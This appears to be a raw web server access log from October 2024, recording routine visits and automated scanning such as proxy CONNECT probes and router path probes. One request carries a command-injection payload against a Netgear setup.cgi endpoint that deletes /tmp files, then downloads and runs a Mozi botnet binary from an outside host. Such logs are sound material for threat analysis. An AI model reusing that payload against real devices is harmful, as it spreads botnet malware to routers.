172.104.11.4 - - [05/Oct/2024:00:08:33 +0330] "GET / HTTP/1.1" 200 6039
173.255.221.189 - - [05/Oct/2024:00:33:33 +0330] "GET / HTTP/1.1" 200 6040
172.105.128.12 - - [05/Oct/2024:00:34:01 +0330] "GET / HTTP/1.1" 200 6040
89.251.243.175 - - [05/Oct/2024:00:43:03 +0330] "GET / HTTP/1.0" 200 6040
182.209.151.125 - - [05/Oct/2024:00:50:03 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 400 778
31.220.1.144 - - [05/Oct/2024:01:06:00 +0330] "GET / HTTP/1.1" 200 6040
154.213.184.18 - - [05/Oct/2024:01:49:27 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
185.224.128.59 - - [05/Oct/2024:01:58:08 +0330] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 805
45.84.89.2 - - [05/Oct/2024:02:07:08 +0330] "GET / HTTP/1.1" 200 6040
94.156.167.81 - - [05/Oct/2024:02:46:06 +0330] "CONNECT 45.61.137.126:7227 HTTP/1.1" 400 811
185.224.128.83 - - [05/Oct/2024:03:11:29 +0330] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 805
138.68.71.68 - - [05/Oct/2024:03:25:27 +0330] "GET / HTTP/1.1" 200 6039
87.120.166.244 - - [05/Oct/2024:03:45:03 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
179.43.133.162 - - [05/Oct/2024:04:03:14 +0330] "CONNECT cloudflare.com:443 HTTP/1.1" 400 811
158.220.103.136 - - [05/Oct/2024:04:15:52 +0330] "POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1" 404 805
109.204.233.40 - - [05/Oct/2024:04:31:15 +0330] "-" 400 1999
175.107.37.123 - - [05/Oct/2024:04:58:12 +0330] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.37.123:33879/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 776
172.168.24.66 - - [05/Oct/2024:04:59:48 +0330] "GET / HTTP/1.1" 200 6041
95.214.27.169 - - [05/Oct/2024:05:04:31 +0330] "GET / HTTP/1.1" 200 6039
95.214.27.169 - - [05/Oct/2024:05:04:32 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [05/Oct/2024:05:04:32 +0330] "GET / HTTP/1.1" 200 6039
95.214.27.169 - - [05/Oct/2024:05:04:32 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
52.183.224.82 - - [05/Oct/2024:05:43:44 +0330] "GET /hudson HTTP/1.1" 404 773
141.98.11.15 - - [05/Oct/2024:06:09:23 +0330] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 805
95.214.27.9 - - [05/Oct/2024:06:38:10 +0330] "GET / HTTP/1.1" 200 6041
80.12.93.168 - - [05/Oct/2024:07:06:27 +0330] "GET / HTTP/1.0" 200 6040
154.213.184.18 - - [05/Oct/2024:07:19:02 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
78.108.177.50 - - [05/Oct/2024:07:22:15 +0330] "GET / HTTP/1.0" 200 6041
51.159.233.215 - - [05/Oct/2024:08:12:42 +0330] "-" 400 2467
87.120.166.244 - - [05/Oct/2024:08:13:07 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
45.156.129.54 - - [05/Oct/2024:08:14:05 +0330] "GET / HTTP/1.1" 200 6039
5.117.43.39 - - [05/Oct/2024:08:17:20 +0330] "GET /admin/?page=33 HTTP/1.1" 302 -
5.117.43.39 - - [05/Oct/2024:08:17:20 +0330] "GET / HTTP/1.1" 200 5293
5.117.43.39 - - [05/Oct/2024:08:17:21 +0330] "GET /favicon.ico HTTP/1.1" 404 778
194.48.251.26 - - [05/Oct/2024:08:22:18 +0330] "CONNECT 45.61.136.175:7227 HTTP/1.1" 400 811
91.229.215.156 - - [05/Oct/2024:08:24:09 +0330] "GET / HTTP/1.1" 200 5291
91.229.215.156 - - [05/Oct/2024:08:24:09 +0330] "GET /javax.faces.resource/theme.css.xhtml?ln=primefaces-aristo HTTP/1.1" 304 -
91.229.215.156 - - [05/Oct/2024:08:24:09 +0330] "GET /javax.faces.resource/css/admin.css.xhtml HTTP/1.1" 304 -
